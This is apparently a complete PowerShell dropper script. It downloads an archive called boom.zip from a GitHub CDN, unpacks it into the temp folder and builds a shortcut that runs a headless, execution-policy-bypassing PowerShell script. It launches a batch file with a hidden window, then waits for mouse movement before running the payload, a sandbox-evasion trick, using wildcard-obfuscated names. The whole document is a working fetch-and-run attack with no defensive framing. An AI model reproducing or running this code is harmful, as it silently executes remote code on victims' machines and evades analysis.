[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") 
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
Invoke-WebRequest https://cdn.statically.io/gh/legalman444/files/1d49def11346bd7d1b2b294489b5951f71b38e27/boom.zip -OutFile $env:temp\boom.zip
Expand-Archive -Force -Path $env:temp\boom.zip -DestinationPath $env:temp\boom
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:temp\boom\boom.lnk")
$Shortcut.TargetPath = "conhost"
$Shortcut.Arguments = "--headless powershell -Exec Bypass %TEMP%\boom\boom2.ps1"
$Shortcut.Save()
Start-Process -FilePath "$env:temp/boom/boom.bat" -WindowStyle Hidden
powershell -w h Add-Type -AssemblyName *m.W*s.F*s;$w=[Windows.Forms.Cursor];$p=$w::Position.X;while(1){if($w::Position.X-ne$p){break}else{Sleep 1}};powershell $env:temp\boom\boom2.ps1